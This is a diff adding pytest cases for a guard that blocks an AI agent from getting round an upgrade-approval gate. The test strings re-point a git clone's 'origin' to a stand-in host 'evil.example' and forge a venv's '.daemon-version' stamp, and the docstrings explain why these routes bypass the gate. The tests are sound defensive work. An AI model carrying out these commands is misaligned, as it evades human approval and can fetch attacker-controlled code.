@@ -415,6 +415,55 @@ class TestManualCheckoutOfTheDaemonClone:
         assert handler.matches(_bash(command)) is False, command
 
 
+class TestDaemonCloneRemoteAndConfigRedirection:
+    """review2 MINOR 2: a redirected `origin` decides which gate runs next.
+
+    ``fetch --tags --force`` (Layer 1) resets a locally re-pointed TAG, but
+    only to whatever `origin` NAMES -- so a `remote set-url` or a `config`
+    write that changes what `origin` points to is the same class of route as
+    the checkout/reset commands already denied: neither moves HEAD by itself,
+    but both decide what the next `checkout` lands on.
+    """
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "git -C .claude/hooks-daemon remote set-url origin https://evil.example/x.git",
+            "git -C .claude/hooks-daemon remote add upstream https://evil.example/x.git",
+            "git -C .claude/hooks-daemon remote rename origin old",
+            "git -C .claude/hooks-daemon remote remove origin",
+            "git -C .claude/hooks-daemon remote rm origin",
+            "git -C .claude/hooks-daemon config remote.origin.url https://evil.example/x.git",
+            "git -C .claude/hooks-daemon config --add remote.origin.fetch '+refs/*:refs/*'",
+            "git -C .claude/hooks-daemon config --unset remote.origin.url",
+        ],
+    )
+    def test_denies_redirecting_where_the_clone_fetches_from(
+        self, handler: UpgradeApprovalGuardHandler, command: str
+    ) -> None:
+        hook_input = _bash(command)
+        assert handler.matches(hook_input) is True, command
+        result = handler.handle(hook_input)
+        assert result.reason is not None
+        assert result.reason.startswith(f"BLOCKED [{AGENT_RULE_ID}]")
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "git -C .claude/hooks-daemon remote -v",
+            "git -C .claude/hooks-daemon remote show origin",
+            "git -C .claude/hooks-daemon remote",
+            "git -C .claude/hooks-daemon config --get remote.origin.url",
+            "git -C .claude/hooks-daemon config -l",
+            "git -C .claude/hooks-daemon config --list",
+        ],
+    )
+    def test_allows_reading_the_clones_remote_and_config(
+        self, handler: UpgradeApprovalGuardHandler, command: str
+    ) -> None:
+        assert handler.matches(_bash(command)) is False, command
+
+
 class TestVenvVersionStampForgery:
     """Item 5: forging a venv's .daemon-version stamp."""
 
@@ -448,6 +497,19 @@ class TestVenvVersionStampForgery:
         """A `.daemon-version` NOT under `untracked/venv*/` is out of scope."""
         assert handler.matches(_bash("cat some/other/.daemon-version")) is False
         assert handler.matches(_write("some/other/.daemon-version", "x")) is False
+
+    def test_denies_a_stamp_under_a_project_that_itself_sits_under_untracked(
+        self, handler: UpgradeApprovalGuardHandler
+    ) -> None:
+        """review2 N2: a project under ANY `untracked/` ancestor (this repo's
+        own worktrees, e.g. `untracked/worktrees/<name>/`) still has its stamp
+        recognised. Matching the FIRST `untracked` segment in the path missed
+        the venv's own `untracked/venv*/` -- the one that actually decides --
+        whenever an outer one came first.
+        """
+        path = "untracked/worktrees/worktree-x/.claude/hooks-daemon/untracked/venv-abc123/.daemon-version"
+        assert handler.matches(_bash(f"echo 4.0.0 > {path}")) is True
+        assert handler.matches(_write(path, "4.0.0\n")) is True
 
 
 class TestNonMatchingCalls:
